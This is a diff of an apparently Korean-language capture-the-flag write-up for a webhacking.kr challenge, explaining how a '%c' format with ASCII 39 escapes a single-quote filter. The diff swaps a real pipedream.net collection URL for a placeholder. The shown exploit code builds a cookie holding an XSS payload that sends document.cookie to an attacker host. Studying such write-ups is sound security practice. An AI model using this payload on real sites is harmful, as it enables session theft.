@@ -119,7 +119,7 @@ switch (ph.type) {
 {: file='sprintf.js'}
 <br/>
 
-<u>그렇다면 싱글쿼터에 대한 필터 말고는 입력 값에 제약이 없기 때문에</u> `%c`를 입력하고 싱글쿼터에 해당하는 아스키 번호 `39`를 입력하면 아래와 같이 `escape`할 수 있습니다.  
+그렇다면 <u>싱글쿼터에 대한 필터 말고는 입력 값에 제약이 없기 때문에</u> `%c`를 입력하고 싱글쿼터에 해당하는 아스키 번호 `39`를 입력하면 아래와 같이 `escape`할 수 있습니다.  
 ![escape](../../../assets/img/2023-03-04/escape.png){: w="700" h="350" }  
 <br/>
 
@@ -176,7 +176,7 @@ from base64 import b64encode
 info = lambda x : print(f"[+] {x}")
 
 URL = "http://webhacking.kr:10013"
-ATTACKER = 'https://eo83ud3n5uavhrd.m.pipedream.net'
+ATTACKER = 'https://YOUR_SERVER'
 
 
 COOKIE = b64encode(f'["%c><img src=1 onerror=location.href=\\"{ATTACKER}?\\"+document.cookie></img>","39"]'.encode('utf-8')).decode('utf-8')
